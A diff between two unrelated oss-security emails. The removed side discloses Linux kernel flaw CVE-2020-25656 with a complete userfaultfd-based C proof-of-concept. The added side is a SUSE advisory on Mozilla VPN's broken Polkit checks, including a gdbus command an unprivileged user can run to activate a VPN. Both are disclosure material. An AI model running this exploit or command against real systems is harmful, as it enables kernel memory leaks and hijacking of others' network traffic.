@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["7393" "Friday" "16" "October" "2020" "11:39:34" "+0800" "Minh Yuan" "yuanmingbuaa@gmail.com" "<CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw@mail.gmail.com>" "219" "[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" "^Cc:" nil nil "10" "2020101603:39:34" "[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" (number mark "        yuanmingbuaa Oct 16  219/7393  " thread-indent "\"[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 30337 invoked by uid 550); 16 Oct 2020 06:05:12 -0000
+Received: (qmail 1570 invoked by uid 550); 3 Aug 2023 10:08:19 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,258 +6,314 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 9226 invoked from network); 16 Oct 2020 03:39:53 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to:cc;
-        bh=iNf5mJT6lyZAV2fZLXiwTzoQhCNBap+G1oFujDAQw1s=;
-        b=IuEs66essDpksu0JLO1rzvtPFJsKIdEevvNXh9gUaCF7DOL7vuBJJiFyb1TB6XbRFl
-         xxxAViHbqzBd82U+Epam4gLOXGEe0Zsa3OdODZQpXjQ8ZL/xWtoA8OT37vuHiI3z2jdu
-         lsFw0PxXxLsvbTPHqkaq+DlKSKEHf9xII/DQU7B+PMozLaV4MgOe7emdfooAmCpUwgcd
-         Yc17utg6wTXn5FQUxplcn/HCOKcoHF2L56ghtR7JAaAqjSdGGSivjhf2pMBmeWiYFPa8
-         2//thfzAkvtMnom5hhQnts/saRPNd7quBDYWDPmG87O7xIObUfFLadp+JaEqIzQT12Y0
-         w2cw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
-        bh=iNf5mJT6lyZAV2fZLXiwTzoQhCNBap+G1oFujDAQw1s=;
-        b=TJwwJiGl7w2lvbWWapuB48+uUTZvVaLa3SeW4d1RVoCCVyEn8nIvNqotVoBmOkvPza
-         JTrbjz+ZgzedrcGd5VJp0NIgDc923l9Taq3nYtAkzkjcBYO2AGNdYlnc+uI+pc5+jaS1
-         rQNIKAB/3Juac0iRpUIos6gzSA1Lsx/gjA/IDyeEGz3+HKQmlN2ukzctteTXZ7BXO1iQ
-         DCUaCwYEQOkCPAoLpmbAtj0x3I+wbEf9yczXCLYhoaXhhvQeSJnrgm4/A6pNsngaU3wd
-         CNeT4LvK1k+AjfMg61nTP2oHZNe9CqJo+MZAVCC5hTooQCq29XNxR8OKOdejUqOp3RJq
-         LD6w==
-X-Gm-Message-State: AOAM531yb/tKPIutDpAxXAtTnYADv4GSIr5DiLiU7+P6ENloFWvzemDC
-	Bn7QDZFl6DSJENY0Dw64oo0hLJ9Mawha2jQU8kprGCJtwdXPJw==
-X-Google-Smtp-Source: ABdhPJwYY9rRNhLNGIfVErQ+MGCKka+AMGGlkktBWbt6ir7qE7pdTWavU+BT+ywH26AAIVrSPYuBcfoTauDnMr+N6DQ=
-X-Received: by 2002:a17:906:6545:: with SMTP id u5mr1676147ejn.346.1602819582004;
- Thu, 15 Oct 2020 20:39:42 -0700 (PDT)
-MIME-Version: 1.0
-Message-ID: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw@mail.gmail.com>
-Content-Type: multipart/alternative; boundary="000000000000d311f305b1c183f7"
-Cc: nopitydays@gmail.com
-Date: Fri, 16 Oct 2020 11:39:34 +0800
-From: Minh Yuan <yuanmingbuaa@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl
+Received: (qmail 1552 invoked from network); 3 Aug 2023 10:08:18 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+	t=1691057286; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type;
+	bh=qhiMpFr01WGpGAvh6LFKEB0CV7i9IHHi0VOZxa/6PEI=;
+	b=fCWZMt6/B2j3/MmNPD1XS5eHNey+1hhKAcLRNX1LwqPpIXWQMuDB4Hz5b8n4duqXrUN1pi
+	T7ubmBXaJ6AsOcU4K/Fpzo4S7y53fmlpesQdbl9egqtN1fAXnor4a8HgdA/wgBaaUBRbTT
+	My49mAvNkhTCgnbMO5UPB73mnYPKlQc=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+	s=susede2_ed25519; t=1691057286;
+	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type;
+	bh=qhiMpFr01WGpGAvh6LFKEB0CV7i9IHHi0VOZxa/6PEI=;
+	b=igyaAhl8aYI7O2YNQg2t4L3Je6B/FkU/8NlIXI/OIzoV8OuuCLn4lMPcx4Z7boHn9PTSvM
+	OTvk4PMD+cv1tnDw==
+Date: Thu, 3 Aug 2023 12:08:05 +0200
+From: Matthias Gerstner <mgerstner@suse.de>
 To: oss-security@lists.openwall.com
+Message-ID: <ZMt8hi5vahYgLG2-@kasco.suse.de>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="MPgI2HG/g+EN/5M0"
+Content-Disposition: inline
+Subject: [oss-security] Mozilla VPN: CVE-2023-4104: Privileged vpndaemon on Linux wrongly
+ and incompletely implements Polkit authentication
 
---000000000000d311f305b1c183f7
-Content-Type: text/plain; charset="UTF-8"
+--MPgI2HG/g+EN/5M0
+Content-Type: text/plain; protected-headers=v1; charset=iso-8859-1
+Content-Disposition: inline
 Content-Transfer-Encoding: quoted-printable
+Date: Thu, 3 Aug 2023 12:08:05 +0200
+From: Matthias Gerstner <mgerstner@suse.de>
+To: oss-security@lists.openwall.com
+Subject: Mozilla VPN: CVE-2023-4104: Privileged vpndaemon on Linux wrongly
+ and incompletely implements Polkit authentication
 
-Hi,
+Hello list,
 
-We recently discovered a uaf read in vt_do_kdgkb_ioctl from linux kernel
-version 3.4 to the latest version (v5.9 for now).
+an openSUSE community packager wanted to add the Mozilla VPN client [1] to
+openSUSE Tumbleweed, which required a review [2] by the SUSE security team,
+as it contains a privileged D-Bus service running as root and a Polkit poli=
+cy.
+In the course of this review we noticed a broken and otherwise lacking Polk=
+it
+authorization logic in the privileged `mozillavpn linuxdaemon` process.
 
-The root cause of this vulnerability is that there exits a race in
-KDGKBSENT and KDSKBSENT.
+We publish this report today, because the maximum embargo period of 90 days=
+ we
+offer has been exceeded. Most of the issues mentioned in this report are
+currently not addressed by upstream, as is outlined in more detail below.
 
-Here are details:
-1. use  KDSKBSENT to allocate a lager heap buffer to funcbufptr;
-2. use KDGKBSENT to obtain the allocated heap pointer in step1 by
-func_table, at the same time, due to KDGKBSENT has no lock, we can use
-KDSKBSENT again to allocate a larger buffer than step1, and the old
-funcbufptr will be freed. However, we've obtained the heap pointer in
-KDGKBSENT, so a uaf read will happen while executing put_user.
+Introduction
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
 
-I've successfully reproduced this bug in a special way.
-However, to write a universal PoC for anyone else to reproduce it,  I use
-userfaultfd to handle the order of "free" and "use" in multithreading
-environment. This is my PoC:
+The Mozilla VPN client is a multi-platform VPN solution offered by Mozilla
+based on technologies like Wireguard. For this review we did not look in
+detail into the VPN protocol specifics and cryptography, but focused on the
+privileged operations performed by the Mozilla VPN client daemon on Linux.
 
-// author by ziiiro@thu
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/ioctl.h>
-#include <string.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <sys/mman.h>
-#include <poll.h>
-#include <pthread.h>
-#include <errno.h>
-#include <stdlib.h>
-#include <signal.h>
-#include <string.h>
-#include <sys/syscall.h>
-#include <linux/userfaultfd.h>
-#include <pthread.h>
-#include <poll.h>
-#include <linux/prctl.h>
-#include <stdint.h>
+The findings in this report relate to the Mozilla VPN client version 2.14.1.
 
-#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
-                       } while (0)
+Broken Polkit Authentication Check
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D
 
-#define KDGKBSENT 0x4B48 /* gets one function key string entry */
-#define KDSKBSENT 0x4B49 /* sets one function key string entry */
+The code for the privileged component in Mozilla VPN on Linux is mostly
+found in mozillavpn-2.14.1/src/apps/vpn/platforms/linux. The D-Bus
+method callbacks are found in src/apps/vpn/platforms/linux/daemon/dbusservi=
+ce.cpp.
 
-struct kbsentry {
-unsigned char kb_func;
-unsigned char kb_string[512];
-};
-int fd;
-static int page_size;
-static void *fault_handler_thread(void *arg) {
-  unsigned long value;
-  static struct uffd_msg msg;
-  static int fault_cnt =3D 0;
-  long uffd;
-  static char *page =3D NULL;
-  struct uffdio_copy uffdio_copy;
-  int len, i;
-  if (page =3D=3D NULL) {
-    page =3D mmap(NULL, page_size, PROT_READ | PROT_WRITE,
-                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (page =3D=3D MAP_FAILED) errExit("mmap (userfaultfd)");
-  }
-  uffd =3D (long)arg;
+Mozilla VPN ships a Polkit policy with the following content:
 
-  for(;;) {
-    struct pollfd pollfd;
-    pollfd.fd =3D uffd;
-    pollfd.events =3D POLLIN;
-    len =3D poll(&pollfd, 1, -1);
+```
+ <action id=3D"org.mozilla.vpn.activate">
+    <description>Activate the Mozilla VPN</description>
+    <message>Activate the Mozilla VPN</message>
+    <defaults>
+      <allow_inactive>no</allow_inactive>
+      <allow_active>auth_admin</allow_active>
+    </defaults>
+  </action>
 
+  <action id=3D"org.mozilla.vpn.deactivate">
+    <description>Deactivate the Mozilla VPN</description>
+    <message>Deactivate the Mozilla VPN</message>
+    <defaults>
+      <allow_inactive>no</allow_inactive>
+      <allow_active>auth_admin</allow_active>
+    </defaults>
+  </action>
+```
 
-    read(uffd, &msg, sizeof(msg));
-    printf("    flags =3D 0x%lx\n", msg.arg.pagefault.flags);
-    printf("    address =3D 0x%lx\n", msg.arg.pagefault.address);
-    switch(fault_cnt) {
-        case 0:
-            puts("triggered in the first page!");
-            break;
-        case 1:
-            puts("triggered in the seccond page!");
-            munmap((void*)0x233000,page_size);
-            void *addr =3D (void*)mmap((void*)0x233000,
-                        page_size,
-                        PROT_READ | PROT_WRITE,
-                        MAP_FIXED | MAP_PRIVATE | MAP_ANON,
-                        -1, 0);
-            if ((unsigned long)addr !=3D 0x233000)
-                errExit("mmap (0x233000)");
-            // register 0x233000 again to trigger put_user
-            struct uffdio_register uffdio_register;
-            uffdio_register.range.start =3D (unsigned long)addr;
-            uffdio_register.range.len   =3D page_size;
-            uffdio_register.mode        =3D UFFDIO_REGISTER_MODE_MISSING;
-            if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) =3D=3D -1)
-                errExit("ioctl: UFFDIO_REGITER");
-            break;
-        case 2:
-            puts("triggered in put_user!");
-            struct kbsentry *kbs;
-            kbs =3D malloc(sizeof(struct kbsentry));
-            kbs->kb_func =3D 0;
+Of these two privileged actions, the Polkit authorization check is only
+performed in the `activate` D-Bus method, while no such check is present
+at all in the `deactivate` method.
 
-strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-bbbbbbbbb");
-            // free old funcbufptr
-            ioctl(fd,KDSKBSENT,kbs);
-            break;
+For the activate D-Bus method the Polkit check is implemented in
+`PolkitHelper::checkAuthorization()` in
+src/apps/vpn/platforms/linux/daemon/polkithelper.cpp line 58:
 
-    }
-    // return to kernel-land
-    uffdio_copy.src =3D (unsigned long)page;
-    uffdio_copy.dst =3D (unsigned long)msg.arg.pagefault.address &
-~(page_size - 1);
-    uffdio_copy.len =3D page_size;
-    uffdio_copy.mode =3D 0;
-    uffdio_copy.copy =3D 0;
-    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) =3D=3D -1)
-        errExit("ioctl: UFFDIO_COPY");
+```
+h.m_subject =3D polkit_unix_process_new_for_owner(getpid(), 0, -1);
+```
 
-    fault_cnt++;
+The UNIX process Polkit subject is deprecated and shouldn't be used
+anymore for most cases, because it affected by race conditions by design.
+Instead the D-Bus sender subject should be used, which is based on the UNIX
+domain socket used by D-Bus, to obtain the credentials of the client via the
+Linux kernel.
 
-  }
-}
-// use userfaultfd to handle free->use
-void setup_pagefault(void *addr, unsigned size) {
-  long uffd;
-  pthread_t th;
-  struct uffdio_api uffdio_api;
-  struct uffdio_register uffdio_register;
-  int s;
-  // new userfaulfd
+Even worse, the UNIX process Polkit subject is initialized here using
+`getpid()` as the process ID and `-1` for the user ID. The latter asks
+Polkit to determine the given PID's user ID by looking into /proc.
+In summary this asks Polkit to check whether the privileged Mozilla VPN
+D-Bus service _itself_ is authorized to perform the action. Since The
+Mozilla VPN D-Bus service runs as root, this will always be true.
 
-  uffd =3D syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
-  if (uffd =3D=3D -1) errExit("userfaultfd");
-  // enabled uffd object
-  uffdio_api.api =3D UFFD_API;
-  uffdio_api.features =3D 0;
-  if (ioctl(uffd, UFFDIO_API, &uffdio_api) =3D=3D -1) errExit("ioctl:
-UFFDIO_API");
-  // register memory address
-  uffdio_register.range.start =3D (unsigned long)addr;
-  uffdio_register.range.len   =3D size;
-  uffdio_register.mode        =3D UFFDIO_REGISTER_MODE_MISSING;
-//UFFDIO_REGISTER_MODE_WP;//
-  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) =3D=3D -1) errExit("io=
-ctl:
-UFFDIO_REGITER");
-  // monitor page fault
-  s =3D pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
-  if (s !=3D 0) errExit("pthread_create");
-}
+This can be verified from the command line using a minimal pseudo
+configuration like this:
 
+    nobody$ gdbus call -y -d org.mozilla.vpn.dbus -o / -m org.mozilla.vpn.d=
+bus.activate \
+        '{"privateKey": "nothing", "serverPublicKey": "nothing", "serverPor=
+t": 1234, "deviceIpv4Address": "127.0.0.2", "serverIpv4AddrIn": "127.0.0.3"=
+, "allowedIPAddressRanges": []}'
 
-int main(int argc, char** argv)
-{
-        struct kbsentry *kbs;
-        pthread_t th;
-        page_size =3D sysconf(_SC_PAGE_SIZE);
-        void *addr =3D (void*)mmap((void*)0x233000,
-                            page_size * 2,
-                            PROT_READ | PROT_WRITE,
-                            MAP_FIXED | MAP_PRIVATE | MAP_ANON,
-                            -1, 0);
-        if ((unsigned long)addr !=3D 0x233000)
-            errExit("mmap (0x233000)");
-        setup_pagefault(addr, page_size * 2);
-        kbs =3D malloc(sizeof(struct kbsentry));
-        kbs->kb_func =3D 0;
-        fd =3D open("/dev/tty1", O_RDONLY, 0);
+This D-Bus call will work without any authentication, even if a low privile=
+ge
+user account like `nobody` runs it.
 
-strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
-a");
-        // allocate a lager funcbufptr
-        ioctl(fd,KDSKBSENT,kbs);
-        // use KDGKBSENT to access the new funcbufptr
-        ioctl(fd,KDGKBSENT,addr + page_size - 0x20);
-        return 1;
+The impact is that arbitrary local users can configure arbitrary VPN
+setups using Mozilla VPN and thus possibly redirect network traffic to
+malicious parties, pretend that a secure VPN is present while it
+actually isn't, perform a denial-of-service against an existing VPN connect=
+ion
+or other integrity violations.
 
-}
+Since the daemon does not perform any file system or otherwise dangerous
+operations besides of the network setup, we don't see a possibility to
+escalate privileges beyond the network aspect using this attack vector.
 
-Make sure set KASAN in config, and to use userfaultfd, CONFIG_USERFAULTFD=
-=3Dy
-is also needed. Besides, it needs the privilege to access tty to trigger
-this bug.
+Missing Polkit Authentication Checks
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
 
-We've noticed that this bug was also discovered by Syzbot 8 months ago, but
-no one has successfully reproduced it (
-https://groups.google.com/g/syzkaller-bugs/c/kZsmxkpq3UI/m/J35PFexWBgAJ),
-leaving this issue ignored and upatched yet. Hope this PoC can help
-someone.
+Apart from the fact that the existing Polkit authentication check is
+flawed, there isn't even an attempt to secure any of the other D-Bus
+methods offered by the Mozilla VPN D-Bus service.
 
-Timeline:
-* 10.15.20 - Vulnerability reported to security@kernel.org and
-linux-distros@vs.openwall.org.
-* 10.15.20 - CVE-2020-25656 assigned.
-* 10.16.20 - Vulnerability opened.
+For the following methods Polkit authorization checks should be
+considered, or their scope should be limited by other means:
 
-Thanks,
-Yuan Ming and Bodong Zhao, Tsinghua University
+- getLogs(): returns potentially problematic world-readable log data, even
+  debug logs, e.g. about other users' activities in the system. The
+  same data is publicly available in /var/log/mozillavpn.txt. These
+  logs allow to track what applications other users start, for example.
 
---000000000000d311f305b1c183f7--
+  Log data of system services should generally not be world readable, so
+  this item refers to both the D-Bus API and the logfile in /var/log.
+  This is an information leak (especially since there is also debug data
+  found here) that might facilitate other security issues or might allow
+  other users in the system to deduce what a Mozilla VPN user is doing.
+
+- cleanupLogs(): allows everybody to clear the current logs. This should
+  be restricted to authorized users, otherwise it might be used to clear
+  traces of attacks etc.
+
+- runningApps(): this leaks information from other users'
+  sessions and their apps to everybody in the system. Most of this data
+  is probably also available via `ps` or /proc, respectively. Some
+  hardened systems may not allow this, though. A solution might be to
+  only return data here that belongs to the user making the request on
+  D-Bus.
+
+- firewallApp(): allows to put arbitrary appIDs into split tunneling /
+  exclude, even for other users. This should be restricted to
+  applications of the requesting D-Bus user.
+
+- firewallClear(): clears the exclude list. should also be restricted to
+  entries affecting the calling user.
+
+- deactivate(): everybody may shutdown the whole VPN. There is a
+  deactivate() Polkit action declared but is is never used, as was explained
+  before already.
+
+Suggested Fixes
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+From looking at the D-Bus implementation it is apparent that Mozilla VPN on
+Linux doesn't have a proper multi user concept. We recommended to upstream,=
+ as
+a simple way out of this, to store the UID of the user that successfully
+authenticates during `activate()` and then only allow the other D-Bus metho=
+ds
+for the same user until `deactivate()` is called. Mixing different user
+contexts would be avoided this way.
+
+For this to work, of course, all D-Bus methods would need to be properly
+Polkit authenticated, based on the D-Bus sender subject.
+
+Furthermore we observed that the Mozilla VPN linux daemon only uses its high
+privileges for two things:
+
+- setting up the network
+- monitoring user sessions and attaching to their D-Bus session busses
+  to keep track of running applications ("AppTracker" class).
+
+It could be considered running this service not as root but only with
+the `CAP_NET_ADMIN` capability. This would limit the potential attack
+surface considerably.
+
+Upstream Fixes
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+As a first measure Upstream removed the use Polkit authentication completel=
+y [3].
+This change will be included in an upcoming v2.16.0 release. This
+doesn't really change anything in the security posture of the privileged
+daemon on Linux though, since all D-Bus APIs are still unauthenticated and
+usable by any local user.
+
+In another effort upstream is attempting to introduce better authorization
+controls on the D-Bus API by requiring the caller to possess `CAP_NET_ADMIN`
+permission, or matching the UID of the user that activated the connection. =
+This
+is anticipated to be included in a 2.17.0 release, for which no release date
+is known yet (supposedly in one to two months).
+
+Whether the minor information leaks outlined above like world readable logs
+and keeping track of other users' activities will be addressed by this is
+unclear.
+
+Timeline and Disclosure Process
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D
+
+2023-05-04: We privately shared the findings with security@mozilla.org,
+offering coordinated disclosure according to the openSUSE disclosure policy.
+Upstream created a private bugzilla bug [4] to keep track of the issue.
+
+Until 2023-06-12: There has been a lack of communication by upstream. Relev=
+ant
+questions about the disclosure process remained unanswered, there was no
+formal reply to our report and no wishes have been expressed about how to
+continue the coordinated disclosure, or what the next steps would be.
+
+2023-06-12: We learned that the embargo over this issue was violated by
+upstream via a GitHub PR [3] and, inspired by that, our community packager
+followed suit via another GitHub PR [5].
+
+We asked upstream once more what their intentions are regarding coordinated
+disclosure but did not get a proper response.
+
+2023-08-02: Even though the embargo was already violated and there was no
+clear statement from upstream about the coordinated disclosure process, we
+held back the full report until the 90 days maximum embargo time we offer
+elapsed.
+
+We tried to get additional information from upstream once more and only now
+learned more details about their plans on how to address this, which we
+outlined in the previous section.
+
+2023-08-03: Our continued requests to assign a CVE for this issue (Mozilla =
+is a
+CVE CNA) resulted in a last minute assignment of CVE-2023-4104.
+
+References
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+[1]: https://github.com/mozilla-mobile/mozilla-vpn-client
+[2]: https://bugzilla.suse.com/show_bug.cgi?id=3D1209921
+[3]: https://github.com/mozilla-mobile/mozilla-vpn-client/pull/7055
+[4]: https://bugzilla.mozilla.org/show_bug.cgi?id=3D1831318
+[5]: https://github.com/mozilla-mobile/mozilla-vpn-client/pull/7151
+
+Best Regards
+
+Matthias
+
+--=20
+Matthias Gerstner <matthias.gerstner@suse.de>
+Security Engineer
+https://www.suse.com/security
+GPG Key ID: 0x14C405C971923553
+=20
+SUSE Software Solutions Germany GmbH
+HRB 36809, AG N=FCrnberg
+Gesch=E4ftsf=FChrer: Ivo Totev, Andrew McDonald, Werner Knoblich
+
+--MPgI2HG/g+EN/5M0
+Content-Type: application/pgp-signature; name="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmTLfIUACgkQFMQFyXGS
+NVPs+BAAkC0d2ght1hJRkwtu161c8UIuFLf4OW/GJyfGBRRmob8AhauRgxvsZ20e
+X69e289jMqNLD7+w1W72j0RkujWT+0O3KUkDvfePh5PaeH8aEy2DqtZeyEGZywJ2
+5e/JfHgwXd+nouIvD4H8EhftWwt+3qEDb/v1gzthzB5/NtmnWWJIGZXRxOrdIEPN
+E9NjB+5Zr7hB4bZn+QCwQCcsW6tOSdPWuTeVxeK62qjngDn33xSawanrJ1AAhp0b
+QvBmAm0pBlUcFYL1ia7BRnIyMcOoIgVkplmJXVo7SFTtoZ1hAHiQ185L2ntICZeo
+4KeP8og0G9NssqE10kyHTTgBif9/4gq8ZpFoGxsbo6tMa7jTatWibUTmerCVyM/q
+3XRYAzGqjY6elDlQb2iZ/IDWS8xkM1SdG9BZwM0XJxP/Js4hyF2dwW7xKNZskCMH
+p/H35TIkD4UGQsJ1GGya/3NeTFoxSooWRvgPegqJF7rct8uy7qu5XjBSbUBdx0q3
+NlF629VPhtFVHWWlrFE5DpEOEssOFluZDb9fVXDFfSVRl098WhmWg+apPzvFV3GC
+SS82HbxKocqhM26EjPTlFc3zaHgb+GkqbS06jwlWsws2ry8TlbQwfa8mS780et31
+4S2/AXiL0hFyNCdaDh80wq2uJLjOTl+99qpE52XQx/gCRrYLzwM=
+=owvQ
+-----END PGP SIGNATURE-----
+
+--MPgI2HG/g+EN/5M0--
